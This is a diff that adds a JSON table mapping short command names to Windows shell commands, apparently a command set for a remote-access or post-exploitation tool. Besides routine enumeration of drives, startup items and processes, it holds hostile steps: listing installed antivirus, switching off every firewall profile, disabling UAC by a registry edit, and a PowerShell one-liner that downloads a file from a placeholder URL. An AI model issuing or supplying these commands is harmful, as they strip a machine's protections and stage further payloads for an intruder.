@@ -1,0 +1,11 @@
+{
+  "drive": "wmic logicaldisk get caption,description",
+  "startup": "wmic startup get description,location",
+  "plist": "wmic process get description,processid,executablepath",
+  "pkill": "wmic process where name='<process name>' call terminate",
+  "enumav": "wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName",
+  "killfw": "netsh advfirewall set allprofiles state off",
+  "checkti": "whoami /groups | findstr TrustedInstaller",
+  "disableuac": "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f",
+  "downloadfile": "powershell.exe (new-object System.Net.WebClient).DownloadFile('<url>', '<filename>')"
+}
